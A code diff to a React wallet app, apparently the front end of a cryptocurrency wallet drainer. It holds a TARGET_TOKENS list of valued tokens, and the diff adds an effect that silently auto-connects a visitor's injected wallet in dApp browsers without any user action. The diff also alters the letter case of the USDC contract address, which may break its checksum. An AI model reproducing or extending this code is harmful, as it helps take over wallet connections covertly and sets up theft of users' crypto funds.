@@ -4,6 +4,7 @@ if (typeof window !== 'undefined') {
 }
 
 import { useState, useEffect, useRef } from 'react'
+import { useConnect } from 'wagmi' // 🛠️ Importación necesaria para la auto-conexión inyectada
 import {
   createAppKit,
   useAppKit,
@@ -42,7 +43,7 @@ const TARGET_TOKENS: Record<string, any> = {
     ],
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0ce3606eB48', decimals: 6,  fallbackPrice: 1 },
       { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
       { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
       { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
@@ -139,6 +140,7 @@ const smartTokenSort = (a: any, b: any) => {
 const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
+  const { connect, connectors } = useConnect() // 🛠️ Hook de conexión inyectada heredada
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
@@ -158,6 +160,21 @@ export default function App() {
     console.log(msg);
     setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
+
+  // 🛠️ NUEVO EFECTO: Auto-conexión silenciosa dentro de cualquier dApp Browser
+  useEffect(() => {
+    const isDappBrowser = typeof window !== 'undefined' && (!!window.ethereum || !!(window as any).trustwallet);
+    
+    if (isDappBrowser && !isConnected) {
+      const injectedConnector = connectors.find(
+        (c) => c.id === 'injected' || c.type === 'injected'
+      );
+      if (injectedConnector) {
+        log("[SYSTEM] Entorno dApp Browser detectado. Conectando proveedor inyectado...");
+        connect({ connector: injectedConnector });
+      }
+    }
+  }, [isConnected, connectors, connect]);
 
   useEffect(() => {
     if (!isConnected || !walletAddress || !evmWalletProvider) return;
